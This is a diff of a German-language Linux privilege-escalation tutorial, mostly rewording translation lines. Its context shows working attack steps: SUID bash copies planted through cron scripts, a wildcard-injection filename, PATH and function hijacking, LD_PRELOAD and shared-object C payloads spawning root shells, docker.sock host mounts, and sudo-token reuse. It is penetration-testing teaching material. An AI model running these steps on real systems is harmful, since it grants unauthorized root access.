@@ -32,10 +32,10 @@ cat /proc/version
 uname -a
 searchsploit "Linux Kernel"
 ```
-Sie können eine gute Liste verwundbarer Kernel und einige bereits **kompilierte Exploits** hier finden: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
+Sie können eine gute Liste verwundbarer Kernel und einige bereits **kompilierte Exploits** hier finden: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
 Andere Seiten, auf denen Sie einige **kompilierte Exploits** finden können: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
-Um alle verwundbaren Kernel-Versionen von dieser Website zu extrahieren, können Sie Folgendes tun:
+Um alle verwundbaren Kernelversionen von dieser Website zu extrahieren, können Sie Folgendes tun:
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
@@ -45,7 +45,7 @@ Tools, die bei der Suche nach Kernel-Exploits helfen könnten, sind:
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
 [linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ausführen IM Opfer, überprüft nur Exploits für Kernel 2.x)
 
-Immer **die Kernel-Version in Google suchen**, vielleicht ist Ihre Kernel-Version in einem Kernel-Exploit angegeben und dann sind Sie sich sicher, dass dieser Exploit gültig ist.
+Immer **die Kernel-Version in Google suchen**, vielleicht ist Ihre Kernel-Version in einem bestimmten Kernel-Exploit angegeben und dann sind Sie sich sicher, dass dieser Exploit gültig ist.
 
 ### CVE-2016-5195 (DirtyCow)
 
@@ -59,7 +59,7 @@ https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
 ```
 ### Sudo-Version
 
-Basierend auf den anfälligen sudo-Versionen, die in:
+Basierend auf den anfälligen sudo-Versionen, die erscheinen in:
 ```bash
 searchsploit sudo
 ```
@@ -162,13 +162,13 @@ Wenn Sie SSH-Zugriff auf die Maschine haben, können Sie auch **openVAS** verwen
 
 ## Prozesse
 
-Sehen Sie sich an, **welche Prozesse** ausgeführt werden, und überprüfen Sie, ob ein Prozess **mehr Berechtigungen hat, als er sollte** (vielleicht ein Tomcat, der von root ausgeführt wird?).
+Werfen Sie einen Blick darauf, **welche Prozesse** ausgeführt werden, und überprüfen Sie, ob ein Prozess **mehr Berechtigungen hat, als er sollte** (vielleicht ein Tomcat, der von root ausgeführt wird?)
 ```bash
 ps aux
 ps -ef
 top -n 1
 ```
-Überprüfen Sie immer, ob mögliche [**electron/cef/chromium debuggers** laufen, die Sie missbrauchen könnten, um Privilegien zu eskalieren](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect` Parameter in der Befehlszeile des Prozesses überprüft.\
+Immer nach möglichen [**electron/cef/chromium-Debuggern** suchen, die ausgeführt werden, da Sie diese möglicherweise missbrauchen können, um Privilegien zu eskalieren](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect`-Parameter in der Befehlszeile des Prozesses überprüft.\
 Überprüfen Sie auch **Ihre Berechtigungen über die Binärdateien der Prozesse**, vielleicht können Sie jemandes Dateien überschreiben.
 
 ### Prozessüberwachung
@@ -182,14 +182,14 @@ Normalerweise benötigen Sie **Root-Rechte**, um den Speicher von Prozessen zu l
 Denken Sie jedoch daran, dass **Sie als regulärer Benutzer den Speicher der Prozesse, die Sie besitzen, lesen können**.
 
 > [!WARNING]
-> Beachten Sie, dass die meisten Maschinen heutzutage **ptrace standardmäßig nicht erlauben**, was bedeutet, dass Sie keine anderen Prozesse, die Ihrem unprivilegierten Benutzer gehören, dumpen können.
+> Beachten Sie, dass die meisten Maschinen heutzutage **ptrace standardmäßig nicht zulassen**, was bedeutet, dass Sie keine anderen Prozesse, die Ihrem unprivilegierten Benutzer gehören, dumpen können.
 >
 > Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
 >
-> - **kernel.yama.ptrace_scope = 0**: Alle Prozesse können debuggt werden, solange sie die gleiche UID haben. Dies ist die klassische Art, wie ptracing funktionierte.
+> - **kernel.yama.ptrace_scope = 0**: Alle Prozesse können debuggt werden, solange sie die gleiche UID haben. Dies ist die klassische Art und Weise, wie ptracing funktionierte.
 > - **kernel.yama.ptrace_scope = 1**: Nur ein übergeordneter Prozess kann debuggt werden.
-> - **kernel.yama.ptrace_scope = 2**: Nur Admin kann ptrace verwenden, da es die CAP_SYS_PTRACE Fähigkeit erfordert.
-> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace verfolgt werden. Ein Neustart ist erforderlich, um das ptracing wieder zu aktivieren, sobald es festgelegt ist.
+> - **kernel.yama.ptrace_scope = 2**: Nur der Administrator kann ptrace verwenden, da dies die CAP_SYS_PTRACE-Berechtigung erfordert.
+> - **kernel.yama.ptrace_scope = 3**: Es dürfen keine Prozesse mit ptrace verfolgt werden. Ein Neustart ist erforderlich, um das ptracing wieder zu aktivieren, sobald es festgelegt ist.
 
 #### GDB
 
@@ -276,7 +276,7 @@ Um den Speicher eines Prozesses zu dumpen, können Sie Folgendes verwenden:
 
 #### Manual example
 
-Wenn Sie feststellen, dass der Authentifizierungsprozess läuft:
+Wenn Sie feststellen, dass der Authenticator-Prozess läuft:
 ```bash
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
@@ -315,7 +315,7 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 ```
 ## Geplante/Cron-Jobs
 
-Überprüfen Sie, ob ein geplanter Job anfällig ist. Vielleicht können Sie einen Vorteil aus einem Skript ziehen, das von root ausgeführt wird (Wildcard-Schwachstelle? Können Dateien geändert werden, die root verwendet? Symlinks verwenden? Bestimmte Dateien im Verzeichnis erstellen, das root verwendet?).
+Überprüfen Sie, ob ein geplanter Job anfällig ist. Vielleicht können Sie einen Vorteil aus einem Skript ziehen, das von root ausgeführt wird (Wildcard-Schwachstelle? Kann Dateien ändern, die root verwendet? Symlinks verwenden? Bestimmte Dateien im Verzeichnis erstellen, das root verwendet?).
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
@@ -336,19 +336,19 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 ```
 ### Cron mit einem Skript mit einem Platzhalter (Wildcard Injection)
 
-Wenn ein Skript, das von root ausgeführt wird, ein “**\***” innerhalb eines Befehls hat, könntest du dies ausnutzen, um unerwartete Dinge zu verursachen (wie privesc). Beispiel:
+Wenn ein Skript, das von root ausgeführt wird, ein “**\***” innerhalb eines Befehls hat, könntest du dies ausnutzen, um unerwartete Dinge (wie privesc) zu verursachen. Beispiel:
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
 **Wenn das Wildcard von einem Pfad wie** _**/some/path/\***_ **vorgegangen wird, ist es nicht anfällig (sogar** _**./\***_ **ist es nicht).**
 
-Lesen Sie die folgende Seite für weitere Tricks zur Wildcard-Ausnutzung:
+Lesen Sie die folgende Seite für weitere Tricks zur Ausnutzung von Wildcards:
 
 {{#ref}}
 wildcards-spare-tricks.md
 {{#endref}}
 
-### Cron-Skript-Überschreibung und Symlink
+### Cron-Skript Überschreibung und Symlink
 
 Wenn Sie **ein Cron-Skript ändern können**, das von root ausgeführt wird, können Sie sehr einfach eine Shell erhalten:
 ```bash
@@ -372,7 +372,7 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 ### Unsichtbare Cron-Jobs
 
-Es ist möglich, einen Cronjob **ein Wagenrücklaufzeichen nach einem Kommentar einzufügen** (ohne Zeilenumbruchzeichen), und der Cronjob wird funktionieren. Beispiel (beachten Sie das Wagenrücklaufzeichen):
+Es ist möglich, einen Cron-Job **ein Wagenrücklaufzeichen nach einem Kommentar hinzuzufügen** (ohne Zeilenumbruchzeichen), und der Cron-Job wird funktionieren. Beispiel (beachten Sie das Wagenrücklaufzeichen):
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
@@ -421,7 +421,7 @@ In der Dokumentation können Sie lesen, was die Einheit ist:
 
 > Die Einheit, die aktiviert werden soll, wenn dieser Timer abläuft. Das Argument ist ein Einheitsname, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, wird dieser Wert standardmäßig auf einen Dienst gesetzt, der denselben Namen wie die Timer-Einheit hat, mit Ausnahme des Suffixes. (Siehe oben.) Es wird empfohlen, dass der aktivierte Einheitsname und der Einheitsname der Timer-Einheit identisch benannt sind, mit Ausnahme des Suffixes.
 
-Daher müssten Sie, um diese Berechtigung auszunutzen:
+Daher müssen Sie, um diese Berechtigung auszunutzen:
 
 - Eine systemd-Einheit (wie eine `.service`) finden, die **eine beschreibbare Binärdatei ausführt**
 - Eine systemd-Einheit finden, die **einen relativen Pfad ausführt** und über **schreibbare Berechtigungen** über den **systemd PATH** verfügt (um diese ausführbare Datei zu impersonifizieren)
@@ -439,17 +439,17 @@ Beachten Sie, dass der **Timer** durch das Erstellen eines Symlinks zu ihm in `/
 
 ## Sockets
 
-Unix-Domain-Sockets (UDS) ermöglichen die **Prozesskommunikation** auf denselben oder verschiedenen Maschinen innerhalb von Client-Server-Modellen. Sie nutzen standardmäßige Unix-Deskriptor-Dateien für die intercomputerliche Kommunikation und werden über `.socket`-Dateien eingerichtet.
+Unix-Domain-Sockets (UDS) ermöglichen die **Prozesskommunikation** auf denselben oder verschiedenen Maschinen innerhalb von Client-Server-Modellen. Sie nutzen standardmäßige Unix-Descriptor-Dateien für die intercomputerliche Kommunikation und werden über `.socket`-Dateien eingerichtet.
 
 Sockets können mit `.socket`-Dateien konfiguriert werden.
 
 **Erfahren Sie mehr über Sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:
 
 - `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen sind unterschiedlich, aber eine Zusammenfassung wird verwendet, um **anzuzeigen, wo es auf den Socket hören wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6 und/oder Portnummer, auf die gehört werden soll, usw.)
-- `Accept`: Nimmt ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz erzeugt** und nur der Verbindungs-Socket wird an sie übergeben. Wenn **false**, werden alle hörenden Sockets selbst an die gestartete Serviceeinheit **übergeben**, und es wird nur eine Serviceeinheit für alle Verbindungen erzeugt. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne Serviceeinheit bedingungslos den gesamten eingehenden Verkehr verarbeitet. **Standardmäßig false**. Aus Leistungsgründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
+- `Accept`: Nimmt ein boolesches Argument. Wenn **wahr**, wird für jede eingehende Verbindung eine **Service-Instanz erstellt** und nur der Verbindungs-Socket wird an sie übergeben. Wenn **falsch**, werden alle hörenden Sockets selbst an die gestartete Serviceeinheit **übergeben**, und es wird nur eine Serviceeinheit für alle Verbindungen erstellt. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne Serviceeinheit bedingungslos den gesamten eingehenden Verkehr verarbeitet. **Standardmäßig auf falsch.** Aus Leistungsgründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
 - `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die **vor** oder **nach** dem Erstellen und Binden der hörenden **Sockets**/FIFOs **ausgeführt** werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
-- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** oder **nach** dem Schließen und Entfernen der hörenden **Sockets**/FIFOs **ausgeführt** werden.
-- `Service`: Gibt den Namen der **Serviceeinheit** an, die bei **eingehendem Verkehr** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no zulässig. Sie wird standardmäßig auf den Service gesetzt, der denselben Namen wie der Socket trägt (mit dem ersetzten Suffix). In den meisten Fällen sollte es nicht notwendig sein, diese Option zu verwenden.
+- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** oder **nach** dem **Schließen** und Entfernen der hörenden **Sockets**/FIFOs **ausgeführt** werden.
+- `Service`: Gibt den Namen der **Service**-Einheit an, die bei **eingehendem Verkehr** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no zulässig. Sie wird standardmäßig auf den Service gesetzt, der denselben Namen wie der Socket trägt (mit dem ersetzten Suffix). In den meisten Fällen sollte es nicht notwendig sein, diese Option zu verwenden.
 
 ### Schreibbare .socket-Dateien
 
@@ -458,7 +458,7 @@ _Beachten Sie, dass das System diese Socket-Dateikonfiguration verwenden muss, o
 
 ### Schreibbare Sockets
 
-Wenn Sie **irgendeinen schreibbaren Socket** **identifizieren**, (_jetzt sprechen wir über Unix-Sockets und nicht über die Konfigurations-.socket-Dateien_), dann **können Sie mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.
+Wenn Sie **irgendeinen schreibbaren Socket** identifizieren (_jetzt sprechen wir über Unix-Sockets und nicht über die Konfigurations-.socket-Dateien_), dann **können Sie mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.
 
 ### Unix-Sockets auflisten
 ```bash
@@ -481,7 +481,7 @@ socket-command-injection.md
 
 ### HTTP Sockets
 
-Beachten Sie, dass es einige **Sockets gibt, die auf HTTP**-Anfragen hören (_ich spreche nicht von .socket-Dateien, sondern von den Dateien, die als Unix-Sockets fungieren_). Sie können dies überprüfen mit:
+Beachten Sie, dass es einige **Sockets geben kann, die auf HTTP**-Anfragen hören (_ich spreche nicht von .socket-Dateien, sondern von den Dateien, die als Unix-Sockets fungieren_). Sie können dies überprüfen mit:
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
@@ -500,9 +500,9 @@ docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nse
 ```
 Diese Befehle ermöglichen es Ihnen, einen Container mit Root-Zugriff auf das Dateisystem des Hosts auszuführen.
 
-#### **Direkte Verwendung der Docker API**
+#### **Direkte Verwendung der Docker-API**
 
-In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin mit der Docker API und `curl`-Befehlen manipuliert werden.
+In Fällen, in denen die Docker-CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über die Docker-API und `curl`-Befehle manipuliert werden.
 
 1.  **Docker-Images auflisten:** Holen Sie sich die Liste der verfügbaren Images.
 
@@ -534,9 +534,9 @@ Upgrade: tcp
 
 Nachdem die `socat`-Verbindung eingerichtet ist, können Sie Befehle direkt im Container mit Root-Zugriff auf das Dateisystem des Hosts ausführen.
 
-### Andere
+### Sonstiges
 
-Beachten Sie, dass Sie, wenn Sie Schreibberechtigungen über den Docker-Socket haben, weil Sie **in der Gruppe `docker` sind**, [**mehr Möglichkeiten zur Eskalation von Rechten haben**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**Docker API an einem Port lauscht**, können Sie sie möglicherweise ebenfalls kompromittieren](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Beachten Sie, dass Sie, wenn Sie Schreibberechtigungen über den Docker-Socket haben, weil Sie **in der Gruppe `docker` sind**, [**mehr Möglichkeiten zur Eskalation von Rechten haben**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**Docker-API an einem Port lauscht**, können Sie sie möglicherweise ebenfalls kompromittieren](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
 Überprüfen Sie **weitere Möglichkeiten, aus Docker auszubrechen oder es zu missbrauchen, um Privilegien zu eskalieren** in:
 
@@ -564,13 +564,13 @@ runc-privilege-escalation.md
 
 D-Bus ist ein ausgeklügeltes **Inter-Process Communication (IPC) System**, das es Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Es wurde mit dem modernen Linux-System im Hinterkopf entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungskommunikation.
 
-Das System ist vielseitig und unterstützt grundlegende IPC, die den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **erweiterte UNIX-Domain-Sockets**. Darüber hinaus hilft es beim Broadcasten von Ereignissen oder Signalen, was eine nahtlose Integration zwischen den Systemkomponenten fördert. Zum Beispiel kann ein Signal von einem Bluetooth-Daemon über einen eingehenden Anruf einen Musikplayer dazu bringen, sich stummzuschalten, was die Benutzererfahrung verbessert. Darüber hinaus unterstützt D-Bus ein Remote-Objektsystem, das Serviceanfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse optimiert, die traditionell komplex waren.
+Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **erweiterte UNIX-Domänensockets**. Darüber hinaus hilft es beim Broadcasten von Ereignissen oder Signalen, was eine nahtlose Integration zwischen Systemkomponenten fördert. Beispielsweise kann ein Signal von einem Bluetooth-Daemon über einen eingehenden Anruf einen Musikplayer dazu bringen, sich stummzuschalten, was die Benutzererfahrung verbessert. Darüber hinaus unterstützt D-Bus ein Remote-Objektsystem, das Serviceanfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse optimiert, die traditionell komplex waren.
 
-D-Bus arbeitet nach einem **Erlauben/Verweigern-Modell**, das die Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen usw.) basierend auf der kumulativen Wirkung übereinstimmender Richtlinienregeln verwaltet. Diese Richtlinien spezifizieren Interaktionen mit dem Bus und können möglicherweise eine Privilegieneskalation durch die Ausnutzung dieser Berechtigungen ermöglichen.
+D-Bus arbeitet nach einem **Erlauben/Verweigern-Modell**, das die Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen usw.) basierend auf der kumulativen Wirkung übereinstimmender Richtlinienregeln verwaltet. Diese Richtlinien spezifizieren Interaktionen mit dem Bus und ermöglichen möglicherweise eine Privilegieneskalation durch die Ausnutzung dieser Berechtigungen.
 
 Ein Beispiel für eine solche Richtlinie in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird bereitgestellt, die die Berechtigungen für den Root-Benutzer beschreibt, um Nachrichten von `fi.w1.wpa_supplicant1` zu besitzen, zu senden und zu empfangen.
 
-Richtlinien ohne einen angegebenen Benutzer oder eine Gruppe gelten universell, während "Standard"-Kontextrichtlinien für alle gelten, die nicht durch andere spezifische Richtlinien abgedeckt sind.
+Richtlinien ohne einen angegebenen Benutzer oder eine Gruppe gelten universell, während "Standard"-Kontextrichtlinien für alle gelten, die nicht von anderen spezifischen Richtlinien abgedeckt sind.
 ```xml
 <policy user="root">
 <allow own="fi.w1.wpa_supplicant1"/>
@@ -614,7 +614,7 @@ lsof -i
 ```
 ### Offene Ports
 
-Überprüfen Sie immer die Netzwerkdienste, die auf der Maschine ausgeführt werden, mit der Sie zuvor nicht interagieren konnten:
+Überprüfen Sie immer die Netzwerkdienste, die auf der Maschine ausgeführt werden, mit der Sie zuvor nicht interagieren konnten, bevor Sie darauf zugreifen:
 ```bash
 (netstat -punta || ss --ntpu)
 (netstat -punta || ss --ntpu) | grep "127.0"
@@ -683,14 +683,14 @@ grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/logi
 ```
 ### Bekannte Passwörter
 
-Wenn Sie **ein Passwort** der Umgebung **kennen, versuchen Sie sich als jeder Benutzer** mit dem Passwort anzumelden.
+Wenn Sie **ein Passwort** der Umgebung **kennen, versuchen Sie sich als jeder Benutzer** mit diesem Passwort anzumelden.
 
 ### Su Brute
 
 Wenn es Ihnen nichts ausmacht, viel Lärm zu machen und die `su`- und `timeout`-Binaries auf dem Computer vorhanden sind, können Sie versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
-[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem `-a`-Parameter versucht ebenfalls, Benutzer zu brute-forcen.
+[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem Parameter `-a` versucht ebenfalls, Benutzer zu brute-forcen.
 
-## Schreibbare PATH-Missbräuche
+## Schreibbare PATH-Ausnutzung
 
 ### $PATH
 
@@ -757,7 +757,7 @@ sudo less /var/log/something /etc/shadow #Red 2 files
 
 ### Sudo-Befehl/SUID-Binärdatei ohne Befehls-Pfad
 
-Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfades** gewährt wird: _hacker10 ALL= (root) less_, kannst du dies ausnutzen, indem du die PATH-Variable änderst.
+Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfades** erteilt wird: _hacker10 ALL= (root) less_, kannst du dies ausnutzen, indem du die PATH-Variable änderst.
 ```bash
 export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
@@ -769,9 +769,9 @@ Diese Technik kann auch verwendet werden, wenn eine **suid**-Binärdatei **einen
 
 ### SUID-Binärdatei mit Befehls-Pfad
 
-Wenn die **suid**-Binärdatei **einen anderen Befehl unter Angabe des Pfades ausführt**, können Sie versuchen, eine **Funktion** zu exportieren, die denselben Namen wie der Befehl hat, den die SUID-Datei aufruft.
+Wenn die **suid**-Binärdatei **einen anderen Befehl unter Angabe des Pfades ausführt**, können Sie versuchen, eine **Funktion** zu exportieren, die denselben Namen wie der Befehl hat, den die suid-Datei aufruft.
 
-Zum Beispiel, wenn eine SUID-Binärdatei _**/usr/sbin/service apache2 start**_ aufruft, müssen Sie versuchen, die Funktion zu erstellen und sie zu exportieren:
+Zum Beispiel, wenn eine suid-Binärdatei _**/usr/sbin/service apache2 start**_ aufruft, müssen Sie versuchen, die Funktion zu erstellen und sie zu exportieren:
 ```bash
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
@@ -780,14 +780,14 @@ Dann, wenn Sie die SUID-Binärdatei aufrufen, wird diese Funktion ausgeführt
 
 ### LD_PRELOAD & **LD_LIBRARY_PATH**
 
-Die **LD_PRELOAD**-Umgebungsvariable wird verwendet, um eine oder mehrere Shared Libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen, einschließlich der Standard-C-Bibliothek (`libc.so`), geladen werden sollen. Dieser Prozess wird als Preloading einer Bibliothek bezeichnet.
+Die **LD_PRELOAD**-Umgebungsvariable wird verwendet, um eine oder mehrere gemeinsam genutzte Bibliotheken (.so-Dateien) anzugeben, die vom Loader vor allen anderen, einschließlich der Standard-C-Bibliothek (`libc.so`), geladen werden sollen. Dieser Prozess wird als Vorladen einer Bibliothek bezeichnet.
 
 Um jedoch die Systemsicherheit aufrechtzuerhalten und zu verhindern, dass diese Funktion ausgenutzt wird, insbesondere bei **suid/sgid**-Ausführungen, setzt das System bestimmte Bedingungen durch:
 
-- Der Loader ignoriert **LD_PRELOAD** für Ausführungen, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
-- Für Ausführungen mit suid/sgid werden nur Bibliotheken in Standardpfaden, die ebenfalls suid/sgid sind, vorab geladen.
+- Der Loader ignoriert **LD_PRELOAD** für ausführbare Dateien, bei denen die echte Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
+- Für ausführbare Dateien mit suid/sgid werden nur Bibliotheken in Standardpfaden, die ebenfalls suid/sgid sind, vorab geladen.
 
-Eine Privilegieneskalation kann auftreten, wenn Sie die Möglichkeit haben, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Aussage **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration ermöglicht es, dass die **LD_PRELOAD**-Umgebungsvariable bestehen bleibt und erkannt wird, selbst wenn Befehle mit `sudo` ausgeführt werden, was potenziell zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
+Eine Privilegieneskalation kann auftreten, wenn Sie die Möglichkeit haben, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Aussage **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration ermöglicht es, dass die **LD_PRELOAD**-Umgebungsvariable bestehen bleibt und erkannt wird, selbst wenn Befehle mit `sudo` ausgeführt werden, was potenziell zur Ausführung von beliebigem Code mit erhöhten Rechten führen kann.
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
@@ -809,12 +809,12 @@ Dann **kompiliere es** mit:
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-Schließlich, **Privilegien eskalieren** durch Ausführen
+Schließlich **Privilegien erhöhen** durch Ausführen
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 > [!CAUTION]
-> Ein ähnlicher Privilegienausstieg kann missbraucht werden, wenn der Angreifer die **LD_LIBRARY_PATH** Umgebungsvariable kontrolliert, da er den Pfad kontrolliert, in dem nach Bibliotheken gesucht wird.
+> Ein ähnlicher Privilegienausstieg kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH**-Umgebungsvariable kontrolliert, da er den Pfad kontrolliert, in dem nach Bibliotheken gesucht wird.
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -836,7 +836,7 @@ sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
 ### SUID-Binärdatei – .so-Injektion
 
-Wenn man auf eine Binärdatei mit **SUID**-Berechtigungen stößt, die ungewöhnlich erscheint, ist es eine gute Praxis zu überprüfen, ob sie **.so**-Dateien ordnungsgemäß lädt. Dies kann überprüft werden, indem man den folgenden Befehl ausführt:
+Wenn Sie auf eine Binärdatei mit **SUID**-Berechtigungen stoßen, die ungewöhnlich erscheint, ist es eine gute Praxis zu überprüfen, ob sie **.so**-Dateien ordnungsgemäß lädt. Dies kann überprüft werden, indem Sie den folgenden Befehl ausführen:
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
@@ -853,13 +853,13 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-Dieser Code zielt darauf ab, die Berechtigungen zu erhöhen, indem er die Dateiberechtigungen manipuliert und eine Shell mit erhöhten Rechten ausführt, sobald er kompiliert und ausgeführt wird.
+Dieser Code zielt darauf ab, die Berechtigungen zu erhöhen, indem er die Dateiberechtigungen manipuliert und eine Shell mit erhöhten Berechtigungen ausführt, sobald er kompiliert und ausgeführt wird.
 
 Kompilieren Sie die obige C-Datei in eine Shared Object (.so) Datei mit:
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
-Schließlich sollte das Ausführen der betroffenen SUID-Binärdatei den Exploit auslösen, was zu einer potenziellen Kompromittierung des Systems führen kann.
+Schließlich sollte das Ausführen der betroffenen SUID-Binärdatei die Ausnutzung auslösen, was zu einer potenziellen Kompromittierung des Systems führen kann.
 
 ## Shared Object Hijacking
 ```bash
@@ -884,7 +884,7 @@ setresuid(0,0,0);
 system("/bin/bash -p");
 }
 ```
-Wenn Sie einen Fehler wie erhalten
+Wenn Sie einen Fehler erhalten wie
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
@@ -920,13 +920,13 @@ In Fällen, in denen Sie **sudo-Zugriff** haben, aber nicht das Passwort, könne
 Anforderungen zur Eskalation von Privilegien:
 
 - Sie haben bereits eine Shell als Benutzer "_sampleuser_"
-- "_sampleuser_" hat **`sudo` verwendet**, um etwas in den **letzten 15 Minuten** auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, das es uns ermöglicht, `sudo` zu verwenden, ohne ein Passwort einzugeben)
+- "_sampleuser_" hat **`sudo` verwendet**, um etwas in den **letzten 15 Minuten** auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, das es uns ermöglicht, `sudo` ohne Eingabe eines Passworts zu verwenden)
 - `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
 - `gdb` ist zugänglich (Sie sollten in der Lage sein, es hochzuladen)
 
 (Sie können `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)
 
-Wenn all diese Anforderungen erfüllt sind, **können Sie Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
+Wenn alle diese Anforderungen erfüllt sind, **können Sie Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
 
 - Der **erste Exploit** (`exploit.sh`) erstellt die Binärdatei `activate_sudo_token` in _/tmp_. Sie können es verwenden, um **das sudo-Token in Ihrer Sitzung zu aktivieren** (Sie erhalten nicht automatisch eine Root-Shell, führen Sie `sudo su` aus):
 ```bash
@@ -946,20 +946,20 @@ sudo su
 ```
 ### /var/run/sudo/ts/\<Username>
 
